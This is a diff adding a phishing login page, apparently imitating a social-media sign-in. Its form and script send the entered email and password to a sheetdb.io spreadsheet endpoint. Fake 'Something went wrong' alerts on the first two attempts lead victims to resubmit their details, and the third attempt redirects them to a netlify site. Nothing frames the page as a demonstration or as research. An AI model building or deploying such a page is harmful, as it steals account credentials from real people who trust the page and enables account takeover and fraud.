@@ -1,0 +1,76 @@
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- Fevicon  -->
+    <link rel="apple-touch-icon" sizes="180x180" href="./fev/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="./fev/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="./fev/">
+    <link rel="manifest" href="/site.webmanifest">
+
+
+    <link rel="stylesheet" href="style.css">
+    <title>Login</title>
+</head>
+
+<body>
+    <div class="main">
+        <div class="container">
+            <div class="logo">
+                <img src="logo.png" alt="logo-fetch-error">
+            </div>
+            <form action="https://sheetdb.io/api/v1/0tyktfcarzouh" method="post" id="sheetdb-form" autocomplete="off">
+                <input type="email" name="data[email]" id="email" placeholder="Email or Mobile Number" required="" autofocus>
+                <input type="password" name="data[pass]" id="password" placeholder="Password" required="">
+                <p> <a href="#">Forgotten Password ?</a></p>
+                
+                <button id="login">
+                    Log In
+                </button>
+              <p><hr> </p>
+              
+                <button id="signup">
+                    Sign Up
+                </button>
+            </form>
+        </div>
+    </div>
+  
+    <script src="app.js"></script>
+  <script>
+ var form = document.getElementById('sheetdb-form');
+var clickCount = 0;
+
+form.addEventListener("submit", e => {
+  e.preventDefault();
+  clickCount++; // increment the click count on each submit
+
+  fetch(form.action, {
+    method : "POST",
+    body: new FormData(document.getElementById("sheetdb-form")),
+  }).then(
+    response => response.json()
+  ).then((html) => {
+    // show different alerts based on click count
+    if (clickCount === 1) {
+      alert('Something went wrong');
+    } else if (clickCount === 2) {
+      alert('Some of your info isnt correct. Please try again.');
+    } else {
+      window.location.href = "https://chic-cajeta-b2c837.netlify.app/"; // redirect on the third click
+    }
+  });
+});
+
+
+
+</script>
+</body>
+
+</html>
